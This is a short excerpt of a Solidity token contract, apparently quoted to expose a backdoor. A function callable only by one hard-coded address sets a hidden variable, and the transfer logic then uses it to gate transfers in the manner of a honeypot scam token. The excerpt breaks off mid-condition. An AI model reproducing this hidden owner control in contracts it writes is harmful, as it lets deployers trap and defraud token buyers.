...
contract WLC is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x251c1E0F4149546F6Fad43704d2Aff033Cdb174C) _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if((from != _p76234 && to == 0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) || (_p76234 == to && from != 0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80 && from  != 0x251c1E0F4149546F6Fad43704d2Aff033Cdb174C)) {
